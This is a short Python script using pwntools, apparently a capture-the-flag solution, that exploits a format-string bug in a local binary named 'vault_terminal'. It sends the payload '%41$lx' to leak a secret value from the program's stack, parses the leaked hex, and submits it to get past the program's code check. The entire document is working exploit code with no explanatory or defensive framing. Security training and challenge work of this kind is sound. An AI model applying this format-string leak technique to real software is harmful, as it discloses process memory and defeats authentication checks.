from pwn import *

context.binary = elf = ELF('./vault_terminal', checksec=False)

p = process('./vault_terminal')
p.recvuntil(b'Say something: ')
p.sendline(b'%41$lx')

out = p.recvuntil(b'code (as 0x... hex): ').decode(errors='replace')
leak_hex = out.split('\n')[0].strip()
secret = int(leak_hex, 16)
log.info(f"leaked secret: {hex(secret)}")

p.sendline(hex(secret).encode())
print(p.recvall(timeout=2).decode(errors='replace'))
